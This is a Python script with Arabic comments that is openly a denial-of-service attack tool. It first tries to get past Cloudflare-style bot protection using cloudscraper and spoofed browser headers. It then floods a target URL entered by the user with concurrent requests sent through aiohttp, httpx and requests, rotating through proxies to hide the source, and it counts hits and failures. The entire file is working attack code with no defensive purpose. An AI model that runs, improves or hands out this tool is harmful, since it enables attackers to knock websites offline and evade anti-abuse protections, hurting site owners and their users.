import cloudscraper
import asyncio
import time
import aiohttp
import httpx
import random
from concurrent.futures import ThreadPoolExecutor

# قائمة بروكسيات (يمكنك إضافة المزيد)
PROXY_LIST = [
    "http://proxy1.example.com:8080",
    "http://proxy2.example.com:8080",
    "http://proxy3.example.com:8080",
    # أضف المزيد من البروكسيات هنا
]

# محاولة تجاوز الحمايات باستخدام CloudScraper
def bypass_protection(target_url):
    try:
        print("[*] محاولة تجاوز الحماية باستخدام CloudScraper...")
        scraper = cloudscraper.create_scraper()

        # إعداد Headers لمحاكاة متصفح حقيقي
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }

        # إرسال الطلب باستخدام CloudScraper
        response = scraper.get(target_url, headers=headers, timeout=10)

        if response.status_code == 200:
            print("[*] تجاوز الحماية بنجاح!")
            return scraper.cookies, headers
        else:
            print("[!] فشل تجاوز الحماية، الكود:", response.status_code)
            return None, None
    except Exception:
        # تجاهل الأخطاء
        return None, None


# إرسال طلب باستخدام aiohttp
async def send_request_aiohttp(url, session, request_counter, response_times, semaphore, proxy=None):
    async with semaphore:
        try:
            start_time = time.time()
            if proxy:
                async with session.get(url, proxy=proxy) as response:
                    await response.read()
            else:
                async with session.get(url) as response:
                    await response.read()
            request_counter[0] += 1
            response_times.append(time.time() - start_time)
        except Exception:
            request_counter[1] += 1


# إرسال طلب باستخدام httpx
async def send_request_httpx(url, client, request_counter, response_times, semaphore, proxy=None):
    async with semaphore:
        try:
            start_time = time.time()
            if proxy:
                response = await client.get(url, proxies={"http": proxy, "https": proxy})
            else:
                response = await client.get(url)
            request_counter[0] += 1
            response_times.append(time.time() - start_time)
        except Exception:
            request_counter[1] += 1


# إرسال طلب باستخدام requests
def send_request_requests(url, request_counter, response_times, proxy=None):
    try:
        start_time = time.time()
        if proxy:
            response = requests.get(url, timeout=10, proxies={"http": proxy, "https": proxy})
        else:
            response = requests.get(url, timeout=10)
        if response.status_code == 200:
            request_counter[0] += 1
            response_times.append(time.time() - start_time)
    except Exception:
        request_counter[1] += 1


# الوظيفة الرئيسية للهجوم
async def main(target_url, threads_count, attack_duration, use_proxy=False):
    print("[*] بدء هجوم DoS...")
    request_counter = [0, 0]  # [الطلبات الناجحة, الطلبات الفاشلة]
    response_times = []
    semaphore = asyncio.Semaphore(threads_count)  # التحكم في عدد الطلبات المتزامنة

    # محاولة تجاوز الحماية
    cookies, headers = bypass_protection(target_url)

    if not cookies or not headers:
        print("[!] لم يتم تجاوز الحماية، سيتم متابعة الهجوم بدون كوكيز أو Headers.")

    # إعداد الجلسات
    timeout = aiohttp.ClientTimeout(total=10)
    aiohttp_session_args = {"timeout": timeout}
    httpx_client_args = {}

    if cookies and headers:
        aiohttp_session_args["cookies"] = cookies
        aiohttp_session_args["headers"] = headers
        httpx_client_args["cookies"] = cookies
        httpx_client_args["headers"] = headers

    async with aiohttp.ClientSession(**aiohttp_session_args) as aiohttp_session, httpx.AsyncClient(**httpx_client_args) as httpx_client:
        end_time = time.time() + attack_duration
        tasks = []

        # تشغيل tasks
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            while time.time() < end_time:
                # اختيار بروكسي عشوائي إذا تم تفعيل الخيار
                proxy = random.choice(PROXY_LIST) if use_proxy else None

                # إضافة مهام aiohttp
                tasks.append(asyncio.create_task(send_request_aiohttp(target_url, aiohttp_session, request_counter, response_times, semaphore, proxy)))

                # إضافة مهام httpx
                tasks.append(asyncio.create_task(send_request_httpx(target_url, httpx_client, request_counter, response_times, semaphore, proxy)))

                # إضافة مهام requests
                executor.submit(send_request_requests, target_url, request_counter, response_times, proxy)

                # تجنب إنشاء عدد ضخم من المهام دفعة واحدة
                if len(tasks) >= threads_count:
                    await asyncio.gather(*tasks)
                    tasks = []

            # التأكد من تشغيل أي مهام متبقية
            if tasks:
                await asyncio.gather(*tasks)

    avg_response_time = sum(response_times) / len(response_times) if response_times else 0
    print(f"\n[*] انتهى الهجوم. العدد الكلي للطلبات الناجحة: {request_counter[0]}, الفاشلة: {request_counter[1]}")
    print(f"[*] متوسط زمن الاستجابة: {avg_response_time:.4f} ثواني.")


if __name__ == "__main__":
    import requests
    target_url = input("أدخل عنوان URL المستهدف (http://example.com): ").strip()
    threads_count = int(input("أدخل عدد الخيوط (Threads): ").strip())
    attack_duration = int(input("أدخل مدة الهجوم بالثواني: ").strip())
    
    use_proxy = input("هل تريد استخدام بروكسي؟ (y/n): ").strip().lower() == 'y'

    asyncio.run(main(target_url, threads_count, attack_duration, use_proxy))
